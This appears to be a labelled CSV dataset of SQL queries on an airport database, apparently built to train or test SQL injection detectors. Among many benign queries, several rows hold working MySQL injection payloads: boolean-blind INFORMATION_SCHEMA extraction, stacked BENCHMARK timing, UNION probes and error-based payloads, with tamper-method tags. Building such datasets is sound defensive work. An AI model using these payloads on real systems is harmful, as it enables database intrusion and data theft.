full_query,label,user_inputs,attack_stage,tamper_method,attack_status,statement_type,query_template_id,attack_id,attack_technique,split
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""SV"" OR c.name LIKE CONCAT(""%"", ""China"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,SV China 2,,,,select,airport-S20,,,test
"UPDATE airport SET name = ""Yusuhara Heliport"" WHERE ident = ""RU-0467""",0,Yusuhara Heliport RU-0467,,,,update,airport-U1,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""NG"", ""U.S. Virgin Islands"", ""EU"")));SELECT/**/BENCHMARK(5000000,MD5(0x4b6a4354))#"", ""Kosova"")",1," NG U.S. Virgin Islands EU ));SELECT/**/BENCHMARK(5000000,MD5(0x4b6a4354))# Kosova ",recon,space2comment,failure,insert,airport-I6,stacked-33,stacked,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 670.0 AND 1948.0",0,670.0 1948.0,,,,select,airport-S2,,,test
"INSERT INTO countries (code, name, continent) VALUES (""CI"", ""Micronesia"", ""AS"")",0,CI Micronesia AS,,,,insert,airport-I7,,,test
"DELETE FROM countries WHERE code = ""LR"";",0,LR,,,,delete,airport-D7,,,test
"UPDATE airport SET home_link = ""http://www.pinedaleonline.com/pinedaleairport.HTM"" WHERE name = ""Dorotea Airfield""",0,http://www.pinedaleonline.com/pinedaleairport.HTM Dorotea Airfield,,,,update,airport-U4,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""AU""",0,AU,,,,select,airport-S9,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ZW"" OR c.name LIKE CONCAT(""%"", ""Angola"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,ZW Angola 2,,,,select,airport-S20,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BA"" OR c.name LIKE CONCAT(""%"", ""Portugal"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,BA Portugal 2,,,,select,airport-S20,,,test
SELECT * FROM airport WHERE icao_code = 'LWST';,0,LWST,,,,select,airport-S1,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""GB""",0,GB,,,,select,airport-S9,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""MX""",0,MX,,,,select,airport-S9,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""7NK5"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in (unassigned)"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Grenadian airports"", ""%"");",0,7NK5 Airports in (unassigned) Grenadian airports,,,,select,airport-S18,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Custom Applicators"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Campo di Volo Squadra Avvoltoi, VRISO"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""7XA0"", ""%"");",0,"Custom Applicators Campo di Volo Squadra Avvoltoi, VRISO 7XA0",,,,select,airport-S17,,,test
SELECT * FROM airport WHERE icao_code = 'YMND';,0,YMND,,,,select,airport-S1,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""MC"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,MC 2,,,,select,airport-S19,,,test
"DELETE FROM regions WHERE name = ""El Oued Province"";",0,El Oued Province,,,,delete,airport-D8,,,test
"DELETE FROM airport WHERE name = ""Fazenda Nossa Senhora da Salete Airstrip"";  ",0,Fazenda Nossa Senhora da Salete Airstrip,,,,delete,airport-D2,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Wellington;""",0,Wellington,,,,select,airport-S21,,,train
"DELETE FROM airport WHERE name LIKE ""Nagoya Intercity Helipad"" OR keywords LIKE ""EGXV, EGXV"";  ",0,"Nagoya Intercity Helipad EGXV, EGXV",,,,delete,airport-D3,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Sumisip;""",0,Sumisip,,,,select,airport-S21,,,test
"DELETE FROM runways WHERE airport_ident = ""67IL"";",0,67IL,,,,delete,airport-D5,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""BR-1427"";",0,BR-1427,,,,select,airport-S7,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Trujillo_Airport"" WHERE ident = ""KZ-0057""",0,https://en.wikipedia.org/wiki/Trujillo_Airport KZ-0057,,,,update,airport-U3,,,train
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""MM2M"") OR name LIKE ""O66""",0,MM2M O66,,,,select,airport-S10,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tarry Bank Airport"") and 8191=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 11,1),13,1))>96) then 8191 else (select 7920 union select 3426) end))-- -"");",1," Tarry Bank Airport"") and 8191=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 11,1),13,1))>96) then 8191 else (select 7920 union select 3426) end))-- - ",exploit,lowercase,success,select,airport-S12,boolean-222,boolean,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Fazenda Araçatuba Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Fazenda Araçatuba Airport,,,,select,airport-S14,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (56676, 38245, ""LTAP"", ""TOWER"", ""Hall Beach radio/traffic, 5nm below 3100,"", 118.325)",0,"56676 38245 LTAP TOWER Hall Beach radio/traffic, 5nm below 3100, 118.325",,,,insert,airport-I8,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (38292, ""1LA9"", 59.0, ""X) As iSlu wHERe 4367=4367 UNiOn alL SeLeCT NulL,NulL,NulL,NulL,NulL,NulL-- -"", 0, 0)",1," 38292 1LA9 59.0 X  As iSlu wHERe 4367=4367 UNiOn alL SeLeCT NulL,NulL,NulL,NulL,NulL,NulL-- - 0 0 ",recon,randomcase,failure,insert,airport-I9,union-50,union,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""DM"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,DM 2,,,,select,airport-S19,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""BR""",0,BR,,,,select,airport-S9,,,test
"SELECT * FROM airport WHERE gps_code = ""FAMX"" OR local_code = ""L11""",0,FAMX L11,,,,select,airport-S4,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SX"", ""Estonia"", ""AS"", ""Lapangan Terbang Malaysia"")",0,SX Estonia AS Lapangan Terbang Malaysia,,,,insert,airport-I6,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (54192, 38659, ""KGWB"", ""GND"", ""AWOS 3"", 109.7)",0,54192 38659 KGWB GND AWOS 3 109.7,,,,insert,airport-I8,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""ХБО7, Прибойный"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Sharp Central Star Apartments"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""99KY"", ""%"");",0,"ХБО7, Прибойный Sharp Central Star Apartments 99KY",,,,select,airport-S17,,,test
SELECT * FROM airport WHERE icao_code = 'KDRI';,0,KDRI,,,,select,airport-S1,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 120.0 AND  118.1  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.4  AND  122.8  ORDER BY frequency;",0,120.0 118.1 122.4 122.8,,,,select,airport-S13,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('AGOB','AGOB','AGOB','AGOB');",1, AGOB AGOB AGOB AGOB ,recon,randomcase,success,update,airport-U10,time-112,time,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GM"" GROUP BY r.name ORDER BY r.name ASC;",0,GM,,,,select,airport-S16,,,test
"SELECT * FROM airport WHERE gps_code = ""LIPV"" OR local_code = ""LF3623""",0,LIPV LF3623,,,,select,airport-S4,,,train
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""66CO"",""heliport"", ""Logan Airport"",""https://en.wikipedia.org/wiki/Al_Wajh_Domestic_Airport"",""EU"")",0,66CO heliport Logan Airport https://en.wikipedia.org/wiki/Al_Wajh_Domestic_Airport EU,,,,insert,airport-I3,,,train
"DELETE FROM airport_frequencies WHERE type = ""UNIC"";",0,UNIC,,,,delete,airport-D4,,,test
"SELECT * FROM airport WHERE gps_code = ""GQNM"" OR local_code = ""59WA""",0,GQNM 59WA,,,,select,airport-S4,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""6059"" AS SIGNED) AND a.iso_country = ""AM"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,6059 AM,,,,select,airport-S22,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (27147, ""UT46"", 108.0, ""TURF"", 0, 0)",0,27147 UT46 108.0 TURF 0 0,,,,insert,airport-I9,,,test
"DELETE FROM airport WHERE ident=""IN-0375"";",0,IN-0375,,,,delete,airport-D1,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Tree Bies Resort Heliport""",0,Tree Bies Resort Heliport,,,,select,airport-S3,,,train
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (70899, 3447, ""YGRU"", ""MISC"", ""CLNC DEL"", 132.05)",0,70899 3447 YGRU MISC CLNC DEL 132.05,,,,insert,airport-I8,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Samarqand Region"" AND 4338 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574),1,1))>48) THEN 4338 ELSE (SELECT 5420 UNION SELECT 3981) END))-- -"";",1," Samarqand Region"" AND 4338 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574),1,1))>48) THEN 4338 ELSE (SELECT 5420 UNION SELECT 3981) END))-- - ",exploit,equaltolike,success,select,airport-S15,boolean-234,boolean,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""JP""",0,JP,,,,select,airport-S6,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""UA"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,UA 2,,,,select,airport-S19,,,test
"SELECT * FROM airport WHERE gps_code = ""YRRB"" OR local_code = ""SJOF""",0,YRRB SJOF,,,,select,airport-S4,,,test
"DELETE FROM airport WHERE name = ""Shilo Heliport"" AND 6730=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x72756e77617973 AND table_schema=0x64617461736574 LIMIT 13,1),20,1))>104) THEN 6730 ELSE (SELECT 9683 UNION SELECT 1069) END))-- -"";  ",1," Shilo Heliport"" AND 6730=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x72756e77617973 AND table_schema=0x64617461736574 LIMIT 13,1),20,1))>104) THEN 6730 ELSE (SELECT 9683 UNION SELECT 1069) END))-- - ",exploit,sleep2getlock,success,delete,airport-D2,boolean-120,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""CN"" GROUP BY r.name ORDER BY r.name ASC;",0,CN,,,,select,airport-S5,,,train
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""PW"" GROUP BY r.name ORDER BY r.name ASC;",0,PW,,,,select,airport-S16,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""YE-SU"", ""Qabala District"", ""AF"", ""SN"", ""https://en.wikipedia.org/wiki/Atlantique_Department"", ""Airports in (unassigned)"")",0,YE-SU Qabala District AF SN https://en.wikipedia.org/wiki/Atlantique_Department Airports in (unassigned),,,,insert,airport-I4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""CV"" GROUP BY r.name ORDER BY r.name ASC;",0,CV,,,,select,airport-S16,,,test
"SELECT * FROM airport WHERE continent = ""AF"" AND iso_region LIKE ""CA-QC""",0,AF CA-QC,,,,select,airport-S8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""SS"" GROUP BY r.name ORDER BY r.name ASC;",0,SS,,,,select,airport-S16,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""SB"" OR c.name LIKE CONCAT(""%"", ""Slovenia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,SB Slovenia 4,,,,select,airport-S20,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""01KY"", ""heliport"", ""Wantoat Airport"", 12.511918, -84.479103)",0,01KY heliport Wantoat Airport 12.511918 -84.479103,,,,insert,airport-I1,,,test
"DELETE FROM countries WHERE code = ""CF"";",0,CF,,,,delete,airport-D7,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""NA4"") OR name LIKE ""SDVL""",0,NA4 SDVL,,,,select,airport-S10,,,test
"SELECT id FROM airports WHERE name LIKE ""%IE8Rh06vHKphExr9d77v%"" AND elevation_feet >= 36.0 AND scheduled_service = ""no"" AND type = ""small_airport""",0,IE8Rh06vHKphExr9d77v 36.0 no small_airport,,,,select,airport-S23,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Fazenda Estrela D`Alva Airport"");",0,Fazenda Estrela D`Alva Airport,,,,select,airport-S12,,,test
"SELECT id FROM airports WHERE elevation_feet >= 685.0 AND iso_country = ""US"" AND longitude <= 125.54296 AND scheduled_service = ""no""",0,685.0 US 125.54296 no,,,,select,airport-S23,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.7 AND  122.175  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  121.625  AND  133.88  ORDER BY frequency;",0,122.7 122.175 121.625 133.88,,,,select,airport-S13,,,train
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 222.0 AND 358.0",0,222.0 358.0,,,,select,airport-S2,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""US-3685"", ""small_airport"", ""Dickirson Heliport"", 41.23260116577149"" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162787871,(SELECT (ELT(1603=1603,1))),0x71716a7171,0x78))s), 8446744073709551610, 8446744073709551610))) AND ""WCBj"" LIKE ""WCBj, 15.1619)",1," US-3685 small_airport Dickirson Heliport 41.23260116577149"" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162787871,(SELECT (ELT(1603=1603,1   ,0x71716a7171,0x78  s  8446744073709551610 8446744073709551610    AND ""WCBj"" LIKE ""WCBj 15.1619 ",recon,sleep2getlock,success,insert,airport-I1,error-1,error,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Baya Biru Airport"");",0,Baya Biru Airport,,,,select,airport-S12,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Savanne"";",0,Savanne,,,,select,airport-S15,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 121.0 AND 919.0",0,121.0 919.0,,,,select,airport-S2,,,train
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Voronezh Baltimore Air Base"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Voronezh Baltimore Air Base,,,,select,airport-S14,,,test
